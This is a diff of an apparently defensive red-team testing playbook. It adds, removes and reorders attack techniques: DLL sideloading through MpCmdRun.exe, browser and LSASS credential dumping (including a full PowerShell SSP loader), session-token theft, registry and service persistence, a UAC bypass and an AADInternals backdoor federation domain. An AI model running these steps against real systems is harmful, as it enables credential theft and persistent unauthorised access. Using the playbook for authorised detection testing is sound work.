@@ -31,41 +31,36 @@ Use an ISO to deliver a malicious executable payload
    bash> mkisofs -J -o {{ iso }} {{ payload }}
    ```
 
-## Cloud storage sharing - General guidance
+## Suspicious connections - General guidance
+
+### Guidance
+
+When using a browser, you can override the user agent string by using an extension. For example:
+
+- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
+- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg
+
+You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.
+
+## Suspicious connections - General guidance
+
+### Guidance
+
+When using a browser, you can override the user agent string by using an extension. For example:
+
+- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
+- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg
+
+You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.
+
+## Suspicious connections - Service use
 
 ### Prerequisites
 
-- Have an account on a cloud storage service that allows sharing files via email
+- A valid session token(s) for the user
+  - Retrieve via browser cookie dumping, exporting from the browser web developer console, a browser extension, or another suitable method
 
-### Guidance
-
-Upload then share a file with a target email address via the service. For example, in Google Drive, right click -> share -> share -> enter email -> enter message -> send.
-
-### Notes
-
-Some cloud storage services perform file scanning of uploaded files for malicious content. Consider uploading the file immediately before sharing to limit the impact on testing.
-
-## Suspicious connections - General guidance
-
-### Guidance
-
-When using a browser, you can override the user agent string by using an extension. For example:
-
-- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
-- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg
-
-You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.
-
-## Suspicious connections - General guidance
-
-### Guidance
-
-When using a browser, you can override the user agent string by using an extension. For example:
-
-- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
-- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg
-
-You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.
+# Execution
 
 # Defense Evasion
 
@@ -104,6 +99,25 @@ Drivers can be found in multiple places, including:
 - Aggregators like LOLDrivers and KDU
   - LOLDrivers: https://github.com/magicsword-io/LOLDrivers/tree/main/drivers
   - KDU: https://github.com/hfiref0x/KDU/
+
+## DLL Side Loading - General guidance
+
+### Notes
+
+- For an up-to-date list of side-loadable DLLs, refer to https://hijacklibs.net/
+
+## DLL Search Order Hijacking - MpCmdRun.exe sideloading
+
+MpCmdRun.exe is susceptible to a DLL sideloading hijack via its dependency on MpClient.dll
+
+### Prerequisites
+
+- A DLL with the appropriate exports called `mpclient.dll`
+  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload/mpclient
+
+### Guidance
+
+Copy `c:\program files\windows defender\mpcmdrun.exe` to the same directory as the `mpclient.dll` payload then run `mpcmdrun.exe`
 
 ## UAC Bypass - via fodhelper.exe
 
@@ -152,32 +166,11 @@ cmd> reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
 - https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
 - https://4pfsec.com/offensive-windows-fodhelper-exe/
 
-## DLL Side Loading - General guidance
-
-### Notes
-
-- For an up-to-date list of side-loadable DLLs, refer to https://hijacklibs.net/
-
-## DLL Search Order Hijacking - MpCmdRun.exe sideloading
-
-MpCmdRun.exe is susceptible to a DLL sideloading hijack via its dependency on MpClient.dll
-
-### Prerequisites
-
-- A DLL with the appropriate exports called `mpclient.dll`
-  - Use: https://github.com/2XXE-SRA/payload_resources/tree/master/dllsideload/mpclient
-
-### Guidance
-
-Copy `c:\program files\windows defender\mpcmdrun.exe` to the same directory as the `mpclient.dll` payload then run `mpcmdrun.exe`
-
 ## Conditional Access Policy Modifications - General guidance
 
 ### Notes
 
 - Create a new conditional access policy to avoid modifying production policies. Additionally, consider disabling the policy or setting it to report-only before modifying it. 
-
-# Collection
 
 # Discovery
 
@@ -208,6 +201,8 @@ Transfer tool into environment by downloading from the Internet
 ### Notes
 
 - The maliciousness level of the binary should align with the intent of the test. For testing signature-based checks, use a known malicious tool, such as Mimikatz. For testing sandboxing or similar network security technologies, use an unknown yet still overtly malicious tool, such as one built around the current attack infrastructure. By default, start with the most malicious choice.
+
+# Collection
 
 # Credential Access
 
@@ -263,79 +258,53 @@ Alternatively, you can use the VBScript file from `modexp`: https://modexp.wordp
 
 - Delete the dump file
 
-## LSASS Security Service Provider - Temporary SSP
+## Browser credential dumping - Chromium-based via SharpChrome
 
-Register a Security Service Provider (SSP) for LSASS. This will trigger a DLL load of the SSP into LSASS.
-
-Register an SSP temporarily by calling the AddSecurityPackage() API.
+https://github.com/GhostPack/SharpDPAPI
 
 ### Prerequisites
 
-- Local administrator 
-- A compiled SSP DLL and a method of calling the AddSecurityPackage() API (e.g. custom exe payload)
-    - SSP source: https://github.com/2XXE-SRA/payload_resources/blob/master/c/lsa_ssp.c
-      - This can be compiled using MinGW via `x86_64-w64-mingw32-gcc -shared -municode -o ssp.dll lsa_ssp.c -lsecur32`
-    - SSP loader: https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ssp_loader.ps1
+- kill all processes for the target browser
+- compiled binary 
+	- using Visual Studios: -> load solution file -> set to "Release" -> build
+
+# Impact
+
+## GPO Modifications - General guidance
 
 ### Guidance
 
-Open an administrative PowerShell terminal. 
+To modify a new domain GPO via the Group Policy Editor:
 
-If using the script linked above, run the following command
-
-```
-PS> .\ssp_loader.ps1 {{ ssp_dll_path }}
-```
-
-If loading manually, first set the path to the compiled SSP DLL into a variable
-
-```
-PS> $DllName = "{{ ssp_dll_path }}"
-```
-
-Then load the SSP into LSASS
-
-```
-PS>
-$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
-$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)
-
-$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
-$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
-    'secur32.dll',
-    'Public, Static',
-    [Reflection.CallingConventions]::Standard,
-    [Int32],
-    [Type[]] @([String], [IntPtr]),
-    [Runtime.InteropServices.CallingConvention]::Winapi,
-    [Runtime.InteropServices.CharSet]::Auto)
-
-$Secur32 = $TypeBuilder.CreateType()
-
-if ([IntPtr]::Size -eq 4) {
-    $StructSize = 20
-} else {
-    $StructSize = 24
-}
-
-$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
-[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)
-
-$Secur32::AddSecurityPackage($DllName, $StructPtr)
-```
+1. Log onto domain controller as domain admin
+2. Open the Server Manager -> Tools -> Group Policy Management
+3. On the left menu -> Expand the forest/domains sections then locate the target domain
+4. Expand the target domain and locate the "Group Policy Objects" folder
+5. Right-click the folder -> New -> Enter a name
+6. Locate the newly created GPO -> right-click -> GPO Status -> Un-check enabled
+7. Edit the GPO's setting(s) as desired
 
 ### Cleanup
 
-- The SSP will be removed on system reboot or after manually calling DeleteSecurityPackage()
+Delete the GPO if using a new GPO, otherwise revert any settings changes
 
-### References
+### Notes
 
-- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package#loading-ssp-without-reboot
-
-# Lateral Movement
+Create a new group policy object to avoid modifying production policies. Additionally, consider disabling the policy before modifying it. 
 
 # Exfiltration
+
+## DLP Test - General use
+
+DLP Test (dlptest.com) is a web utility for testing if exfiltration of sensitive data is successful
+
+General usage notes for DLP Test
+
+### Notes
+
+- If sample sensitive data is needed, the site provides it in different types and formats
+- The site supports HTTP, HTTPS, and FTP
+- Do not upload actual sensitive data to the site
 
 ## Exfiltration to cloud storage - General guidance
 
@@ -353,27 +322,7 @@ Select and use a well-known cloud storage service
 
 - Where possible, use cloud storage service already in use in the environment
 
-## DLP Test - General use
-
-DLP Test (dlptest.com) is a web utility for testing if exfiltration of sensitive data is successful
-
-General usage notes for DLP Test
-
-### Notes
-
-- If sample sensitive data is needed, the site provides it in different types and formats
-- The site supports HTTP, HTTPS, and FTP
-- Do not upload actual sensitive data to the site
-
-# Impact
-
-## GPO Modifications - General guidance
-
-### Notes
-
-- Create a new group policy object to avoid modifying production policies. Additionally, consider disabling the policy before modifying it. 
-
-# Execution
+# Lateral Movement
 
 # Persistence
 
@@ -407,22 +356,6 @@ CMD> sc create {{ service_name }} binPath= "{{ command }}"
 
 ```
 CMD> sc delete {{ service_name }}
-```
-
-## Registry Run Key Persistence - via reg.exe
-
-Use built-in reg.exe to persist via the Registry by setting a command to be run on user login
-
-### Guidance
-
-```
-CMD> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{{ key_name }}" /t REG_SZ /F /D "{{ command }}"
-```
-
-### Cleanup
-
-```
-CMD> reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /F /V "{{ key_name }}"
 ```
 
 ## New user persistence - via net.exe
@@ -484,10 +417,10 @@ Use AADInternals to create a backdoor federation domain for persisting access to
 
 ### Prerequisites
 
-- Permissions to modify domain authentication settings
-  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
 - AADInternals installed
   - `Install-Module AADInternals`
+- Permissions to modify domain authentication settings
+  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
 - A target verified domain in Azure AD
   - To add a domain, Go to Azure AD -> custom domain names -> add -> set the provided DNS records for your domain -> wait for the verification to compelete
 - A user with an immutable ID set
